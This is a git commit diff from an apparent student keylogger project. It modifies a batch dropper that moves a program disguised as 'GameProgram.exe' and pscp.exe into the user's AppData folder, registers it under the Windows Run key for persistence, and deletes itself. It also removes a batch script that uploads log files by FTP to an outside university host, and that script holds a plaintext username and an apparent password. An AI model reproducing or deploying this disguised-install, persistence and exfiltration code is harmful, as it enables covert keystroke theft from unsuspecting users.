eec8e34a3d0cc847ca6889e2e4dbd817693997ab
kodieGlosser <kodieglosser@gmail.com>
2015-04-12 21:48:18 -0400

    done for now

--- Keylogger-C#/WindowsFormsApplication1/bin/Release/copyFile.bat
+++ Keylogger-C#/WindowsFormsApplication1/bin/Release/copyFile.bat
@@ -1,6 +1,6 @@
 @echo off
-move /y "GameProgram.exe" "\Users\%USERNAME%\AppData\Local\GameProgram.exe"
-move /y "pscp.exe" "\Users\%USERNAME%\AppData\Local\pscp.exe"
+move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\GameProgram.exe" "\Users\%USERNAME%\AppData\Local\GameProgram.exe"
+move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\pscp.exe" "\Users\%USERNAME%\AppData\Local\pscp.exe"
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v GameProgram /t reg_sz /d "/Users/%USERNAME%/AppData/Local/GameProgram.exe"
 pause
 DEL "%~f0"
--- Keylogger-C#/uploadfile.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-echo user kglosse> log.txt
-echo kglosseCSET3100>> log.txt
-echo bin>> log.txt
-echo put %1>> log.txt
-echo cd /home/kglosse/cset4850/logs/>> log.txt
-echo quit>> log.txt
-ftp -n -s: ftpcmd.dat et791.eng.utoledo.edu
-del log.txt
